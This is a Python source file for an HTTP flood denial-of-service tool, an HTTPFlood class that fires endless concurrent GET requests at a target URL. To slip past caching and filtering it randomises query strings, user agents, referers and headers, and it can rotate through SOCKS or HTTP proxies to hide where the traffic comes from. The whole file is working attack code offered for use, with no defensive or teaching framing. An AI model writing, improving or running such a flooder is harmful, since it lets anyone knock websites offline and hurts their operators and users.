import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
import random
import time
import string

class HTTPFlood:
    def __init__(self, target, threads, rpc, use_proxy=False, proxy_list=None, proxy_manager=None):
        self.target = target
        self.threads = threads
        self.rpc = rpc
        self.use_proxy = use_proxy
        self.proxy_manager = proxy_manager
        self.ua = UserAgent()
        self.sent = 0
        self.referers = [
            'https://www.google.com/search?q=',
            'https://www.bing.com/search?q=',
            'https://search.yahoo.com/search?p=',
            'https://duckduckgo.com/?q=',
            'https://www.facebook.com/',
            'https://www.twitter.com/',
            'https://www.reddit.com/'
        ]
        
    def random_string(self, length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'zh-CN,zh;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
            'Pragma': 'no-cache',
            'Referer': random.choice(self.referers) + self.random_string(),
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        }
    
    def get_random_proxy(self):
        if self.use_proxy and self.proxy_manager:
            return self.proxy_manager.get_random_proxy()
        return None
    
    async def flood(self):
        while True:
            try:
                proxy = self.get_random_proxy()
                connector = None
                
                if proxy and proxy.startswith('socks'):
                    connector = ProxyConnector.from_url(proxy)
                
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = []
                    for _ in range(self.rpc):
                        url = f"{self.target}?{self.random_string()}={self.random_string()}"
                        
                        task = session.get(
                            url,
                            headers=self.get_headers(),
                            proxy=proxy if proxy and not connector else None,
                            timeout=aiohttp.ClientTimeout(total=7),
                            ssl=False
                        )
                        tasks.append(task)
                    
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    self.sent += len([r for r in responses if not isinstance(r, Exception)])
                
            except Exception:
                pass
            
            await asyncio.sleep(0.001)
    
    async def run(self, duration):
        start = time.time()
        tasks = [self.flood() for _ in range(self.threads)]
        
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=duration
            )
        except asyncio.TimeoutError:
            pass
        
        elapsed = time.time() - start
        print(f"HTTP-FLOOD | Sent: {self.sent} | Rate: {self.sent/elapsed:.2f} req/s")